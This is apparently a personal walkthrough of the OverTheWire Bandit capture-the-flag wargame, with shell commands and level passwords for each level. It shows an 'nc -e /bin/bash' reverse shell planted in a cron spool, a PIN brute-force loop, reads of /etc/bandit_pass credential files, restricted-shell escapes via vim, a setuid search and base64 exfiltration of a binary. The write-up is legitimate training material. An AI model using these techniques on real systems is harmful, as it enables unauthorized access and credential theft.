# Bandit

## 1-2

* file named `-`, content is password
* `-` is interpreted by many programs as `stdin`/`stdout`
* `cat -` uses stdin instead of file
* [`cat ./-` works!](https://unix.stackexchange.com/questions/16357/usage-of-dash-in-place-of-a-filename)

## 4-5

* one human readable file and a bunch of binary files
* `find inhere -type f -exec file {} \;`
* `reset` to fix messed up terminal

## 5-6

* `find inhere/ -size 1033c -type f ! -executable -exec sh -c 'file {} | grep ASCII' \;`

## 6-7

* `find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null  `

## 7-8

* `grep millionth data.txt | awk '{printf $2}'`

## 8-9

* `sort data.txt | uniq -u # print only unique lines.`

## 9-10

* `strings data.txt | grep ===`

## 10-11

* `base64 -d data.txt`

## 11-12

* `cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' # rot13.`

## 12-13

```sh
mkdir /tmp/ben && cd /tmp/ben
xxd -r ~/data.txt > zip
file zip # gzip
mv zip z.gz; gunzip z.gz; ls
file z # bzip
bunzip z; ls
file z.out # gzip
mv z.out z.gz
gunzip z.gz;ls
file z # POSIX tar
tar xf z;ls
file data5.bin # POSIX tar
tar xf data5.bin; ls
file data6.bin # bzip2
bunzip2 data6.bin; ls
file data6.bin # gzip2
bunzip2 data6.bin; ls
file data6.bin.out # POSIX tar
tar xf data6.bin.out; ls
file data8.bin # gzip
mv data8.bin d.gz; gunzip d.gz;ls
file d # ASCII, finally :D
cat d # this was hell.
rm -rf /tmp/ben
```

## 13-14

* `ssh bandit14@bandit.labs.overthewire.org -p 2220 -i sshkey14`

## 14-15

* in bandit14:
* `cat /etc/bandit_pass/bandit14 | nc localhost 30000`

## 15-16

* `echo BfMYroe26WYalil77FoDi9qh59eK5xNr | openssl s_client -connect localhost:30001 -ign_eof`
  * `-ign_eof` ignores end of file and keeps connection open for reply

## 16-17

```sh
# fast:
nc localhost -vvz 31000-32000 2>&1 | grep -v refused
for p in 31960 31790 31691 31518 31046; do echo test | nc -vw1 localhost $p; done

# or slower but less work:
nmap -sV localhost -p31000-32000 | grep -v echo # filter out echo servers.

# per usual:
echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -connect localhost:31790 -ign_eof

# save sshkey to sshkey17
ssh bandit17@bandit.labs.overthewire.org -p 2220 -i sshkey17
```

## 17-18

```sh
# unlike diff, git diff also shows the filenames, so we can use wildcards
# without thinking about which filename will be globbed first:
git diff --no-index passwords.*
```

## 18-19

```sh
sshpass -p 'kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd' \
  ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme 2>/dev/null
```

## 19-20

```sh
ls -Alp
./bandit20-do cat /etc/bandit_pass/bandit20
```

---

* out of interest, try to exfiltrate that binary via base64 and the tmux-clipboard:
  * run `tmux` in host and connect to bandit19
    * make sure we run tmux in vi mode: `^b`, `:setw mode-keys vi`
  * `base64 bandit20-do` to print encoded version of binary
  * `^b`+`[`, `k`, `V`, select everything with `^u` and `hjkl`
  * exit out of bandit19
  * open nvim and enter insert mode
  * paste tmux clipboard with `^b`+`]`
  * save file as `bandit20-do.b64` and decode it with `base64 -d bandit20-do.b64 > bandit20-do`
  * `file bandit*` looks like it worked
  * look at how it works with Radare2: `r2 bandit20-do`
    * `aaa;Vpp`, `g main`, `hjkl`
      * `0x080484b7      e894feffff     call sym.imp.execv`
        * `execv` syscall with `"/usr/bin/env"` string
          * https://stackoverflow.com/questions/20823371/what-is-the-difference-between-the-functions-of-the-exec-family-of-system-calls/20823401
  * `execv` honors the set-uid bit
  * `ls -lp`: `-rwsr-x--- 1 bandit20 bandit19 7296 May  7 20:14 bandit20-do`
    * `s` = `setuid + x`
    * `S` = `setuid`
* to find all binaries with the suid bit set: `find / -perm -4000 2>/dev/null`

## 20-21

* let's poke at it: `r2 suconnect`
  * it reads the password from a file, no access :(

* to background an SSH session:
  * `enter`, `~`, `^z`
  * possible escape sequences: `enter`, `~`, `?`

```sh
echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -lp 5000&
./suconnect 5000
```

## 21-22

```sh
ls -Alp /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

## 22-23

```sh
ls -Alp /etc/cron.d
cat /etc/cron.d/cronjob_bandit23 # runs as: bandit23
cat /usr/bin/cronjob_bandit23.sh
cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
```

## 23-24

```sh
ls -Alp /etc/cron.d/
cat /etc/cron.d/cronjob_bandit24 # runs as: bandit24, once a minute.
cat /usr/bin/cronjob_bandit24.sh
```

* `man stat` display file or file system status
* `man timeout` run a command with a time limit
* `/var/spool` data awaiting processing (outgoing mails, print jobs, etc.)

```sh
cd /var/spool/bandit24
# guess you could call that a local reverse shell:
echo 'nc -e /bin/bash localhost 12345' > ben; chmod +x ben; nc -lvp 12345

# wait for connection.
whoami # bandit24, nice.
cat /etc/bandit_pass/bandit24
```

## 24-25

```sh
nc localhost 30002
# ok, so: password space pin.
# invalid entry let's you try again.

for pin in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin >> /tmp/ben; done
cat /tmp/ben | nc localhost 30002 | uniq -u # filter out duplicate error messages.
rm /tmp/ben
```

## 25-26 and 26-27

```sh
cat bandit26.sshkey # copy it to host into file: sshkey26
```

```sh
ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey26 # immediate exit.
# we have a new ascii art, so it's probably figlet.
figlet bandit26 # yep, it's even the default font.

# ssh to 25 and look up the shell:
cat /etc/passwd|grep 26 # bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
file /usr/bin/showtext
cat /usr/bin/showtext # it's more!
cat /home/bandit26/text.txt # permission denied. we don't really need it either.

# but more does not stay open :/
# let's fix that:
figlet bandit26 | wc -l # the ascii art has 6 lines.
stty rows 5 # set terminal height to 5 to force more to scroll.
ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey26 # we got more!

? # see our options.
v # open vim :D
# resize tmux to update stty rows value and give us some room.
:e. # get a list of files in pwd. notice bandit27-do
:e /etc/bandit_pass/bandit26 # 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

:set shell # shell=/usr/bin/showtext
:set shell=/bin/bash # let's get a proper shell!
:!whoami # bandit26
:!./bandit27-do cat /etc/bandit_pass/bandit27 # 3ba3118a22e93127a4ed485be72ef5ea
```
* you can also login directly from bandit25:

```sh
./25 # login to bandit25
ssh -i bandit26.sshkey bandit26@localhost
```

## 27-28

```sh
./27 # login to bandit27
mkdir /tmp/ben
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo .
cd /tmp/ben
ls -Alp
cat README # 0ef186ac70e04ea33b4c1853d2526fa2
rm -rf /tmp/ben
```

## 28-29

```sh
mkdir /tmp/ben && cd /tmp/ben
git clone ssh://bandit28-git@localhost/home/bandit28-git/repo .
ls -Alp
cat README
# username: bandit29
# password has been removed, but properly?
git log # 'fix info leak' amazing :D
git checkout c086d11a00c0648d095d04c089786efef5e01264
cat README # bbc96594b4e001778eee9975372716b2
rm -rf /tmp/ben
```

## 29-30

```sh
mkdir /tmp/ben && cd /tmp/ben
git clone ssh://bandit29-git@localhost/home/bandit29-git/repo .
ls -Alp
cat README.md
git log
git checkout 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7
cat README.md # nope.
git checkout master
git branch -a # sploits?
git checkout sploits-dev # horde5.md? I am confused.
git checkout dev
cat README.md # 5b90576bedb2cc04c86a9e924ce42faf
rm -rf /tmp/ben
```

## 30-31

```sh
mkdir /tmp/ben && cd /tmp/ben
git clone ssh://bandit30-git@localhost/home/bandit30-git/repo .
cat README.md # oh.
ls -Alp
git log
git branch -a
git tag # secret you say.
git checkout tags/secret # fatal: reference is not a tree: tags/secret
# oh again.

find .git # not a whole lot.
grep -r secret .git/ # f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
git checkout f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea # nope, it's a blob.
# maybe it's the password.
ssh bandit31@localhost # it's not.
```

* let's learn about pack-refs:
  * https://git-scm.com/docs/git-pack-refs
  * https://git-scm.com/docs/git-unpack-file

```sh
git verify-pack -v .git/objects/pack/pack-de18a053429e82191f95e66ca5eae12948a1d5fb.pack
git unpack-file f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
cat .merge_file_tXoYcm # 47e603bb428404d265f59c42920d81e5

# one can hope:
ssh bandit31@localhost # muahaha.

# quit out.
rm -rf /tmp/ben
```

## 30-31

```sh
mkdir /tmp/ben && cd /tmp/ben
git clone ssh://bandit31-git@localhost/home/bandit31-git/repo .

git status
echo 'May I come in?' > key.txt

git add key.txt
git add -f key.txt

git commit -m 'knock knock'
git push # 56a9bf19c63d650ce78e6ec0354ee45e

# that was cool.

rm -rf /tmp/ben
```
## 31-32

```sh
# OH NO; IT IS THE UPPERCASE SHELL!
help
help
help
HELP

# ...

$(pwd)
`pwd`
$$ # 19647. it's a start.
${pwd} # sh: 1: /home/bandit32: Permission denied
${shell} # WELCOME TO THE UPPERCASE SHELL, strange.
${user} # sh: 1: bandit32: not found
# aha. let's check `env` on a different machine.
${editor} # really thought that would work.
${pager}
${pwd}../../../bin/bash # of course not.
# SendEnv with ssh does not work either.
$0 # :D
echo $0 # sh
# copy it over via base64/tmux.
# this is one great binary.
cat /etc/bandit_pass/bandit33 # c9c3199ddf4121b10cf581a98d51caee
```

Definitely my favourite so far!

## 33-34

```sh
ls -lap
cat README.md
```
